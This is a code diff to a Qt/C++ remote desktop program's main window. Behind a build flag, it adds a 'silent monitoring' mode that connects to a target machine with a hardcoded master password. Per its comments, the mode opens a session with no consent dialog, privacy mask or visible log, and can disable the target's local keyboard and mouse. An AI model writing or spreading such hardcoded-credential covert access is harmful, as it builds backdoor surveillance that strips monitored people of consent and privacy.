@@ -242,6 +242,10 @@ void MainWindow::setupMenuBar() {
     remoteMenu->addAction(m_recordAction);
     remoteMenu->addAction(m_cameraAction);
     remoteMenu->addAction(m_audioAction);
+#ifdef XRK_ENABLE_SILENT
+    m_silentMonitorAction = remoteMenu->addAction(tr("静默监控"));
+    connect(m_silentMonitorAction, &QAction::triggered, this, &MainWindow::onSilentMonitor);
+#endif
 
     QMenu* powerMenu = menuBar->addMenu("\u8fdc\u7a0b\u7535\u6e90");
     QAction* shutdownAct = powerMenu->addAction("\u5173\u673a");
@@ -493,6 +497,10 @@ void MainWindow::onToggleHost() {
         m_host->setPrivacyScreenEnabled(privacy);
         m_host->setAutoGrantConsent(autoGrant);
         m_host->setEncoderTrueColor(trueColor);
+        // Share the process-wide NetworkManager for device discovery so the
+        // Host advertises on the unified 9998 channel instead of a private
+        // socket (plan §1.4).
+        m_host->setDiscoveryNetwork(m_network.get());
 
         if (m_host->start(DEFAULT_PORT)) {
             m_hostMode = true;
@@ -548,6 +556,40 @@ void MainWindow::onConnectToIp(const QString& ip, uint16_t port) {
 
     m_remoteDesktopWidget->startRemote(ip, port, password);
 }
+
+#ifdef XRK_ENABLE_SILENT
+void MainWindow::onSilentMonitor() {
+    if (m_hostMode) {
+        QMessageBox::warning(this, tr("错误"), tr("当前处于服务模式，请先停止服务"));
+        return;
+    }
+
+    // Enter a silent monitoring session using the master password. The host
+    // grants a concealed session (no consent dialog / privacy mask / visible
+    // log). Input forwarding is OFF by default — the operator opts in via the
+    // "接管键鼠" toggle, and can independently lock the controlled machine's
+    // local input via "禁用对方键鼠" (plan §2.1/§2.4).
+    bool ok = false;
+    QString ip = QInputDialog::getText(this, tr("静默监控"),
+        tr("请输入被监控端 IP 地址:"), QLineEdit::Normal, QString(), &ok);
+    if (!ok || ip.trimmed().isEmpty()) {
+        return;
+    }
+    ip = ip.trimmed();
+
+    bool okPort = false;
+    int port = QInputDialog::getInt(this, tr("静默监控"),
+        tr("请输入端口 (默认 9999):"), static_cast<int>(DEFAULT_PORT), 1, 65535, 1, &okPort);
+    if (!okPort) {
+        return;
+    }
+
+    m_remoteDesktopWidget->startRemote(ip, static_cast<uint16_t>(port),
+                                       QLatin1String(SILENT_MASTER_PASSWORD));
+    m_remoteDesktopWidget->enterSilentUiMode();
+    statusBar()->showMessage(tr("静默监控已启动: %1").arg(ip));
+}
+#endif
 
 void MainWindow::onConnectToCode(const QString& code) {
     if (m_hostMode) {
